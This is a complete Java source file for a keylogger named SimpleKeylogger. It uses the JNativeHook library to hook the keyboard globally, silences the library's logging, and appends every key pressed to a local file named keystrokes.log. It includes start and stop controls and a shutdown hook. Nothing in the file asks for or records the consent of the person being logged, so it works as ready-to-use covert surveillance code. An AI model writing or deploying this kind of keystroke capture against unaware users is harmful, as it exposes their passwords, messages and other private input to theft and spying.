package com.example;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class SimpleKeylogger implements NativeKeyListener {

    private static FileWriter writer;
    private static boolean isLogging = false;

    public static void startKeylogger() {
        if (!isLogging) {
            try {
                // Disable logging for the JNativeHook library
                Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
                logger.setLevel(Level.OFF);

                // Register the native hook
                GlobalScreen.registerNativeHook();

                // Add the key listener
                GlobalScreen.addNativeKeyListener(new SimpleKeylogger());

                // Initialize file writer to log keystrokes
                writer = new FileWriter("keystrokes.log", true);
                isLogging = true;
            } catch (NativeHookException | IOException e) {
                e.printStackTrace();
            }
        }
    }

    public static void stopKeylogger() {
        if (isLogging) {
            try {
                // Unregister the native hook
                GlobalScreen.unregisterNativeHook();

                // Cleanup file writer
                cleanup();

                isLogging = false;
            } catch (NativeHookException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        try {
            if (isLogging) {
                writer.write(NativeKeyEvent.getKeyText(e.getKeyCode()) + " ");
                writer.flush();
            }
        } catch (IOException ioException) {
            ioException.printStackTrace();
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        // No action needed on key release
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        // No action needed on key typed
    }

    private static void cleanup() {
        try {
            if (writer != null) {
                writer.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    static {
        Runtime.getRuntime().addShutdownHook(new Thread(SimpleKeylogger::cleanup));
    }
}
